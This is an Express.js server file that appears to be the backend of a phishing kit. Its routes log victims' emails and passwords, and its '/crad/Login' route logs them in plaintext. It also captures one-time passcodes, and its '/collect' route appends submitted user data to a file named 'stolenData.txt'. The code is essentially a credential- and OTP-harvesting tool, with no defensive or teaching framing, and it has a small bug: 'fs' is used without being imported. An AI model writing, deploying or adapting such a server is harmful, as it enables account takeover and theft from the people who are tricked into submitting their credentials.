const express = require('express')
const path = require('path')
const app = express();
const cors = require('cors');
const bodyParser = require("body-parser");
// Enable CORS for all origins
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// Route for serving the HTML page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname,'public/index.html'));
});

app.get('/Auth', (req, res) => {
    res.sendFile(path.join(__dirname,'/public/OtpPage.html'));
})

app.post('/crad/Login', (req, res) => {
    const email = req.body.email;
    const Password = req.body.password;
    console.log(`Email: ${email}.`)
    console.log(`Password: ${Password}.`)
    res.json({message: "Requested"})

})

app.use(bodyParser.json());

// Route
app.post("/collect", (req, res) => {
    console.log("Executed....");
    try {
        const userData = req.body;

        // Validate incoming data
        if (!userData || typeof userData !== "object") {
            console.error("Invalid data received:", userData);
            return res.status(400).send("Invalid data format");
        }

        console.log("Received user data:", userData);

        // Append data to file (check for errors)
        const filePath = "stolenData.txt";
        try {
            fs.appendFileSync(filePath, JSON.stringify(userData) + "\n", "utf8");
            console.log(`Data saved to ${filePath}`);
        } catch (fileError) {
            console.error("Error writing to file:", fileError);
            return res.status(500).send("File write error");
        }

        res.status(200).send("Data received");
    } catch (error) {
        console.error("Unexpected error:", error);
        res.status(500).send("Internal server error");
    }
});


app.post('/AuthOtp', (req, res) => {
    console.log(res.body);
    const UserOtp = req.body.userOtp;
    console.log(UserOtp)
    res.json({message: "OTP IS SuccessFully Set"})
})

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
